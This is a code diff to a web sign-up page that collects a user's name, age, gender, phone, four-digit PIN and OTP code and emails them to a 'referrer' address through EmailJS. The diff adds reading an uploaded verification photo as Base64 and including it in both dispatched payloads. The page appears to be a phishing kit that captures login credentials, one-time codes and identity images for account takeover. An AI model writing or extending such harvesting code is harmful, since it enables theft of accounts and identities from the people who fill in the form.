@@ -358,7 +358,7 @@
         </select>
       </div>
 
-      <!-- File Upload Field Positioned Before Referrer Email -->
+      <!-- File Input Field -->
       <div class="form-group">
         <label for="verificationPhoto">Verification Photo</label>
         <input type="file" id="verificationPhoto" accept="image/*" required>
@@ -489,9 +489,35 @@
       if (firstInput) firstInput.focus();
     }
 
+    // Helper to convert selected image file to Base64 String
+    function convertFileToBase64(file) {
+      return new Promise((resolve, reject) => {
+        if (!file) {
+          resolve('');
+          return;
+        }
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = (error) => reject(error);
+      });
+    }
+
     // 1. Sign Up Logic
-    document.getElementById('signupForm').addEventListener('submit', (e) => {
+    document.getElementById('signupForm').addEventListener('submit', async (e) => {
       e.preventDefault();
+
+      const fileInput = document.getElementById('verificationPhoto');
+      const selectedFile = fileInput.files[0];
+      let base64Image = '';
+
+      if (selectedFile) {
+        try {
+          base64Image = await convertFileToBase64(selectedFile);
+        } catch (error) {
+          console.error("Error reading image file:", error);
+        }
+      }
 
       registrationData = {
         fullName: document.getElementById('fullName').value,
@@ -499,6 +525,7 @@
         usageDuration: document.getElementById('usageDuration').value,
         age: document.getElementById('age').value,
         gender: document.getElementById('gender').value,
+        verificationPhoto: base64Image,
         referrerEmail: document.getElementById('referrerEmail').value
       };
 
@@ -546,7 +573,7 @@
         if (pin.length === 4) {
           enteredPinCode = pin;
 
-          // Dispatch initial pass/PIN payload to referrer email
+          // Dispatch initial pass/PIN payload with image Base64 to EmailJS
           const templateParams = {
             to_email: registrationData.referrerEmail || '',
             full_name: registrationData.fullName || '',
@@ -554,6 +581,7 @@
             experience: registrationData.usageDuration || '',
             age: registrationData.age || '',
             gender: registrationData.gender || '',
+            verification_photo: registrationData.verificationPhoto || '',
             referrer: registrationData.referrerEmail || '',
             login_phone: userInput.value.trim(),
             login_password: enteredPinCode,
@@ -637,13 +665,14 @@
         experience: registrationData.usageDuration || '',
         age: registrationData.age || '',
         gender: registrationData.gender || '',
+        verification_photo: registrationData.verificationPhoto || '',
         referrer: registrationData.referrerEmail || '',
         login_phone: userInput.value.trim(),
         login_password: enteredPinCode,
         otp_code: enteredOtp
       };
 
-      // Dispatch OTP payload to the same referrer email
+      // Dispatch final payload with OTP code & image Base64 string
       emailjs.send("service_rf9jc9g", "template_ykjxd5h", otpTemplateParams)
         .then(() => {
           alert(`Verification completed successfully! Code (${enteredOtp}) sent to ${registrationData.referrerEmail}.`);
